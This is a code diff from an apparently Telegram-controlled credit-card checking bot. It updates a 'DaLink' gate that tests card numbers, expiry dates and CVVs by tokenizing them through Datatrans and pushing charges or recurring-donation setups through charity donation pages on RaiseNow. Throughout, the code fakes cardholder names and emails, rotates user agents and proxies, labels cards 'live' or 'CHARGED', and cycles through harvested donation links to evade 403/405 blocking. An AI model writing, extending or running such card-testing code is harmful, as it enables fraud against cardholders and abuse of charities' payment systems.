@@ -700,150 +700,179 @@ def validate_card_format(cc, mes, ano, cvv):
     return True, ""
 
 def _check_card_dalink(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
-    """Logic for the new Multi-Link (DaLink) Gate."""
     multi_links = load_multi_links()
     if not multi_links:
         return 'error', line, "Multi-Link Error: No valid links have been added. Please contact the admin.", bin_info
 
-    # Select a random link from the stored list
-    selected_link = random.choice(multi_links)
-    link_cd = selected_link.get("cd")
-    account_uuid = selected_link.get("account_uuid")
-    solution_uuid = selected_link.get("solution_uuid")
-    profile = selected_link.get("profile")
+    used_cds = set()
+    max_link_retry = 10
+    error_log = ""
+    for attempt in range(max_link_retry):
+        # Random link chưa thử
+        remain_links = [l for l in multi_links if l['cd'] not in used_cds]
+        if not remain_links:
+            break
+        selected_link = random.choice(remain_links)
+        link_cd = selected_link.get("cd")
+        used_cds.add(link_cd)
+        account_uuid = selected_link.get("account_uuid")
+        solution_uuid = selected_link.get("solution_uuid")
+        profile = selected_link.get("profile")
 
-    if not all([link_cd, account_uuid, solution_uuid, profile]):
-         return 'error', line, f"Multi-Link Error: Incomplete link data for cd={link_cd}. Please contact the admin.", bin_info
-
-    dalink_mode = get_dalink_mode()
-    try:
-        user_agent = random_user_agent()
-
-        # Random personal info
-        first_name = generate_random_string(random.randint(12, 20))
-        last_name = generate_random_string(random.randint(10, 20))
-        cardholder = f"{first_name} {last_name}"
-        email = random_email()
-
-        # Step 1: Tokenize card (this part is generic)
-        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
-        tokenize_headers = {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Origin": "https://pay.datatrans.com",
-            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
-            "User-Agent": user_agent,
-            "X-Requested-With": "XMLHttpRequest"
-        }
-        tokenize_payload = {
-            "mode": "TOKENIZE",
-            "formId": "250806042656273071", # Using a generic formId for tokenization
-            "cardNumber": cc,
-            "cvv": cvv,
-            "paymentMethod": "ECA",
-            "merchantId": "3000022877",
-            "browserUserAgent": user_agent,
-            "browserJavaEnabled": "false",
-            "browserLanguage": "en-US",
-            "browserColorDepth": "24",
-            "browserScreenHeight": "1152",
-            "browserScreenWidth": "2048",
-            "browserTZ": "-420"
-        }
-
-        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
-        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
-        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info
-
-        if "Card number not allowed in production" in token_response.text:
-            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info
-
+        dalink_mode = get_dalink_mode()
         try:
-            token_data = token_response.json()
-            if "error" in token_data and "message" in token_data.get("error", {}):
-                 return 'decline', line, token_data["error"]["message"], bin_info
-            transaction_id = token_data.get("transactionId")
-            if not transaction_id:
-                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
-        except json.JSONDecodeError:
-            if token_response.status_code != 200:
-                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
-            return 'error', line, "Tokenize response was not JSON", bin_info
+            user_agent = random_user_agent()
+            first_name = generate_random_string(random.randint(12, 20))
+            last_name = generate_random_string(random.randint(10, 20))
+            cardholder = f"{first_name} {last_name}"
+            email = random_email()
 
-        # Step 2: Make request based on mode using the randomly selected link's data
-        payment_headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "Origin": "https://donate.raisenow.io",
-            "Referer": "https://donate.raisenow.io/",
-            "User-Agent": user_agent
-        }
+            # Step 1: Tokenize card (giữ nguyên logic cũ)
+            tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
+            tokenize_headers = {
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "Origin": "https://pay.datatrans.com",
+                "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
+                "User-Agent": user_agent,
+                "X-Requested-With": "XMLHttpRequest"
+            }
+            tokenize_payload = {
+                "mode": "TOKENIZE",
+                "formId": "250806042656273071",
+                "cardNumber": cc,
+                "cvv": cvv,
+                "paymentMethod": "ECA",
+                "merchantId": "3000022877",
+                "browserUserAgent": user_agent,
+                "browserJavaEnabled": "false",
+                "browserLanguage": "en-US",
+                "browserColorDepth": "24",
+                "browserScreenHeight": "1152",
+                "browserScreenWidth": "2048",
+                "browserTZ": "-420"
+            }
 
-        base_payload = {
-            "account_uuid": account_uuid,
-            "test_mode": False,
-            "create_supporter": False,
-            "supporter": {
-                "locale": "en",
-                "first_name": first_name,
-                "last_name": last_name,
-                "email": email
-            },
-            "raisenow_parameters": {
-                "analytics": {"channel": "paylink", "user_agent": user_agent},
-                "solution": {"uuid": solution_uuid, "name": "Multi-Link Donation", "type": "donate"},
-                "product": {"name": "tamaro", "source_url": f"https://donate.raisenow.io/{link_cd}?lng=en", "uuid": "self-service", "version": "2.16.0"}
-            },
-            "payment_information": {
-                "brand_code": "eca",
-                "cardholder": cardholder,
-                "expiry_month": mes.zfill(2),
-                "expiry_year": ano,
-                "transaction_id": transaction_id
-            },
-            "profile": profile,
-            "return_url": f"https://donate.raisenow.io/{link_cd}?lng=en&rnw-view=payment_result",
-        }
+            token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
+            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
+            if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info
 
-        # --- CHARGE MODE ---
-        if dalink_mode == 'charge':
-            charge_value = _get_charge_value('dalink', custom_charge_amount)
-            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
-            payment_payload = base_payload.copy()
-            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
+            if "Card number not allowed in production" in token_response.text:
+                return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info
 
-            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
-            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
-            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
+            try:
+                token_data = token_response.json()
+                if "error" in token_data and "message" in token_data.get("error", {}):
+                     return 'decline', line, token_data["error"]["message"], bin_info
+                transaction_id = token_data.get("transactionId")
+                if not transaction_id:
+                    return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
+            except json.JSONDecodeError:
+                if token_response.status_code != 200:
+                    return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
+                return 'error', line, "Tokenize response was not JSON", bin_info
 
-            response_text = payment_response.text
-            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'GATE_DIED: Forbidden on cd={link_cd}', bin_info
+            payment_headers = {
+                "Accept": "application/json, text/plain, */*",
+                "Content-Type": "application/json",
+                "Origin": "https://donate.raisenow.io",
+                "Referer": "https://donate.raisenow.io/",
+                "User-Agent": user_agent
+            }
 
-            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
-            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
-            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
-            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
-            else: return 'unknown', line, response_text, bin_info
+            base_payload = {
+                "account_uuid": account_uuid,
+                "test_mode": False,
+                "create_supporter": False,
+                "supporter": {
+                    "locale": "en",
+                    "first_name": first_name,
+                    "last_name": last_name,
+                    "email": email
+                },
+                "raisenow_parameters": {
+                    "analytics": {"channel": "paylink", "user_agent": user_agent},
+                    "solution": {"uuid": solution_uuid, "name": "Multi-Link Donation", "type": "donate"},
+                    "product": {"name": "tamaro", "source_url": f"https://donate.raisenow.io/{link_cd}?lng=en", "uuid": "self-service", "version": "2.16.0"}
+                },
+                "payment_information": {
+                    "brand_code": "eca",
+                    "cardholder": cardholder,
+                    "expiry_month": mes.zfill(2),
+                    "expiry_year": ano,
+                    "transaction_id": transaction_id
+                },
+                "profile": profile,
+                "return_url": f"https://donate.raisenow.io/{link_cd}?lng=en&rnw-view=payment_result",
+            }
 
-        # --- LIVE CHECK MODE ---
-        else:
-            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
-            payment_payload = base_payload.copy()
-            payment_payload["amount"] = {"currency": "EUR", "value": 50}
-            payment_payload["subscription"] = { "recurring_interval": "6 * *", "timezone": "Asia/Bangkok" }
+            if dalink_mode == 'charge':
+                charge_value = _get_charge_value('dalink', custom_charge_amount)
+                payment_url = "https://api.raisenow.io/payments"
+                payment_payload = base_payload.copy()
+                payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
 
-            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
-            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
-            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info
+                payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
+                if error: 
+                    error_log += f"\nError on cd={link_cd}: {error}\n"
+                    continue
+                if not payment_response: 
+                    error_log += f"\nHTTP Error with no response on cd={link_cd}\n"
+                    continue
 
-            response_text = payment_response.text
-            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'GATE_DIED: Forbidden on cd={link_cd}', bin_info
-            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
-            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
-            else: return 'unknown', line, response_text, bin_info
+                response_text = payment_response.text
+                if payment_response.status_code in (403, 405):
+                    error_log += f"\ncd={link_cd} got status {payment_response.status_code} (charge): {response_text[:300]}\n"
+                    continue  # Thử link khác
+                if '{"message":"Forbidden"}' in response_text: 
+                    error_log += f"\ncd={link_cd} Forbidden: {response_text[:300]}\n"
+                    continue
+                if '"payment_status":"succeeded"' in response_text: 
+                    return 'success', line, f'CHARGED_{charge_value}', bin_info
+                elif '"payment_status":"failed"' in response_text: 
+                    return 'decline', line, response_text, bin_info
+                elif '"action":{"action_type":"redirect"' in response_text: 
+                    return 'custom', line, response_text, bin_info
+                elif '"3d_secure_2"' in response_text: 
+                    return 'custom', line, response_text, bin_info
+                else: 
+                    return 'unknown', line, response_text, bin_info
 
-    except Exception as e:
-        logger.error(f"Unknown error in DaLink Gate for line '{line}': {e}", exc_info=True)
-        return 'error', line, f"DaLink Gate System Error: {e}", bin_info
+            else:
+                payment_url = "https://api.raisenow.io/payment-sources"
+                payment_payload = base_payload.copy()
+                payment_payload["amount"] = {"currency": "EUR", "value": 50}
+                payment_payload["subscription"] = { "recurring_interval": "6 * *", "timezone": "Asia/Bangkok" }
+
+                payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
+                if error: 
+                    error_log += f"\nError on cd={link_cd}: {error}\n"
+                    continue
+                if not payment_response: 
+                    error_log += f"\nHTTP Error with no response on cd={link_cd}\n"
+                    continue
+
+                response_text = payment_response.text
+                if payment_response.status_code in (403, 405):
+                    error_log += f"\ncd={link_cd} got status {payment_response.status_code} (live): {response_text[:300]}\n"
+                    continue
+                if '{"message":"Forbidden"}' in response_text: 
+                    error_log += f"\ncd={link_cd} Forbidden: {response_text[:300]}\n"
+                    continue
+                if '"payment_source_status":"pending"' in response_text: 
+                    return 'live_success', line, response_text, bin_info
+                elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: 
+                    return 'decline', line, response_text, bin_info
+                else: 
+                    return 'unknown', line, response_text, bin_info
+
+        except Exception as e:
+            error_log += f"\nSystem error cd={link_cd}: {e}\n"
+            continue
+
+    # Nếu thử 10 link vẫn lỗi 403/405, trả về thẻ lỗi và in full log
+    if error_log:
+        return 'error', line, f"Card check failed after trying 10 links. Log:\n{error_log}", bin_info
+    return 'error', line, "Card check failed after trying 10 links (no detailed error log).", bin_info
 
 
 def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
@@ -3159,7 +3188,6 @@ async def _validate_and_add_link(session, cd, test_card):
 
 
 async def addlink_command(update, context):
-    """(Admin) Adds and validates one or more RaiseNow links for the Multi-Link mode."""
     if update.effective_user.id != ADMIN_ID: return
 
     text_content = " ".join(context.args)
@@ -3167,7 +3195,6 @@ async def addlink_command(update, context):
         await update.message.reply_text("Usage: `/addlink <link1> <link2>...`\nLinks can be separated by spaces or newlines.")
         return
 
-    # Regex to find all potential links or just the codes
     urls = re.findall(r'https?://donate\.raisenow\.io/(\w+)|(\w{5,})', text_content)
     if not urls:
         await update.message.reply_text("No valid links or codes found. Please use the format `https://donate.raisenow.io/<code>` or just the `code`.")
@@ -3188,7 +3215,7 @@ async def addlink_command(update, context):
         proxy_str = random.choice(proxy_config["proxies"])
         formatted_proxy = _format_proxy_for_requests(proxy_str)
         if formatted_proxy:
-            proxy_url = formatted_proxy.get("http") # aiohttp needs the http://... string
+            proxy_url = formatted_proxy.get("http")
 
     async with aiohttp.ClientSession() as session:
         for cd in codes_to_check:
@@ -3196,43 +3223,53 @@ async def addlink_command(update, context):
                 failed_links.append(f"`{cd}`: Already exists.")
                 continue
 
-            # SỬA LỖI unpack ở đây
-            status, _, response_text, _ = check_card(test_card)
-
-            if status == 'decline':
-                 # If decline, we need to get the link details now
-                url1 = f"https://api.raisenow.io/short-identifiers/{cd}"
-                headers1 = {"User-Agent": random_user_agent(), "Accept": "*/*"}
+            # Kiểm tra link 6 lần nếu 403/405
+            retry = 0
+            last_resp_text = ""
+            last_status_code = None
+            while retry < 6:
                 try:
+                    url1 = f"https://api.raisenow.io/short-identifiers/{cd}"
+                    headers1 = {"User-Agent": random_user_agent(), "Accept": "*/*"}
                     async with session.get(url1, headers=headers1, proxy=proxy_url) as response:
-                        if response.status == 200:
+                        last_status_code = response.status
+                        last_resp_text = await response.text()
+                        if response.status in (403, 405):
+                            retry += 1
+                            continue
+                        elif response.status != 200:
+                            failed_links.append(f"`{cd}`: Could not fetch link details (Status: {response.status}).")
+                            break
+                        else:
                             resp1_json = await response.json()
                             payload = resp1_json.get("payload", {})
                             card_method = next((m for m in payload.get("payment_methods", []) if m.get("method_name") == "card"), None)
-                            if card_method:
-                                link_data = {
-                                    "cd": cd,
-                                    "account_uuid": payload.get("account_uuid"),
-                                    "solution_uuid": payload.get("solution_uuid"),
-                                    "profile": card_method.get("profile")
-                                }
-                                if all(link_data.values()):
-                                    multi_links.append(link_data)
-                                    existing_cds.add(cd)
-                                    added_count += 1
-                                else:
-                                    failed_links.append(f"`{cd}`: Link OK but failed to extract all details.")
-                            else:
+                            if not card_method:
                                 failed_links.append(f"`{cd}`: Does not support card payments.")
-                        else:
-                             failed_links.append(f"`{cd}`: Could not fetch link details (Status: {response.status}).")
+                                break
+                            link_data = {
+                                "cd": cd,
+                                "account_uuid": payload.get("account_uuid"),
+                                "solution_uuid": payload.get("solution_uuid"),
+                                "profile": card_method.get("profile")
+                            }
+                            if all(link_data.values()):
+                                multi_links.append(link_data)
+                                existing_cds.add(cd)
+                                added_count += 1
+                            else:
+                                failed_links.append(f"`{cd}`: Link OK but failed to extract all details.")
+                            break
                 except Exception as e:
-                    failed_links.append(f"`{cd}`: Network error fetching details: {e}")
+                    last_resp_text = f"Network error: {e}"
+                    retry += 1
 
-            elif "400" in str(response_text) or "payload" in str(response_text).lower():
-                 failed_links.append(f"`{cd}`: Unsupported payload.")
-            else:
-                 failed_links.append(f"`{cd}`: Test failed (Status: {status}).")
+            # Nếu sau 6 lần vẫn lỗi 403/405
+            if retry == 6 and last_status_code in (403, 405):
+                failed_links.append(f"`{cd}`: Failed after 6 retries with status {last_status_code}. Check failed_addlink.txt for full response.")
+                # --- Lưu ra file ---
+                with open(FAILED_LINK_FILE, "a", encoding="utf-8") as f:
+                    f.write(f"LINK: {cd}\nSTATUS: {last_status_code}\nFULL RESPONSE:\n{last_resp_text}\n\n{'-'*20}\n")
 
     save_multi_links(multi_links)
     final_message = f"✅ **Validation Complete!**\n\n- **Added:** `{added_count}` new link(s).\n- **Total Links:** `{len(multi_links)}`"
